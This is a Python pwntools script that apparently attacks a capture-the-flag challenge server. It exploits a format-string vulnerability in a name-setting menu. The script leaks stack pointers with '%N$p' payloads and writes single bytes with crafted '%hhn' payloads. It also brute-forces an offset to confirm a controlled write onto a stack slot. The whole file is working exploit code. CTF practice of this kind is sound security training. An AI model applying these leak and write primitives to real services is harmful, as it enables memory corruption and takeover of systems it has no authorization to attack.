#!/usr/bin/env python3
from pwn import *

context.log_level = 'error'
HOST = 'challs.insec.club'
PORT = 40009


def recv_menu(io):
    io.recvuntil(b'>> ')


def set_name(io, payload):
    recv_menu(io)
    io.sendline(b'1')
    io.recvuntil(b'Enter new name: ')
    io.sendline(payload)
    io.recvuntil(b'Player: ')
    return io.recvline().strip()


def leak_ptr(io, idx):
    out = set_name(io, f'%{idx}$p'.encode())
    if out == b'(nil)':
        return 0
    return int(out.decode(), 16)


def write_hhn(io, addr, val):
    width = val if val != 0 else 256
    fmt = f'%{width}c%12$hhn'.encode()
    payload = (fmt + b'\x00').ljust(16, b'A') + p64(addr)
    set_name(io, payload)


print('delta status before17 after17')
for delta in range(0xF0, 0x106):
    io = None
    try:
        io = remote(HOST, PORT, timeout=5)
        before17 = leak_ptr(io, 17)
        leak18 = leak_ptr(io, 18)
        target = leak18 - delta
        write_hhn(io, target, 0x42)
        after17 = leak_ptr(io, 17)
        status = 'MATCH' if (after17 & 0xFF) == 0x42 else 'ok'
        print(f'{delta:#x} {status} {before17:#x} {after17:#x}')
    except Exception as e:
        print(f'{delta:#x} ERR {type(e).__name__}')
    finally:
        try:
            if io is not None:
                io.close()
        except Exception:
            pass
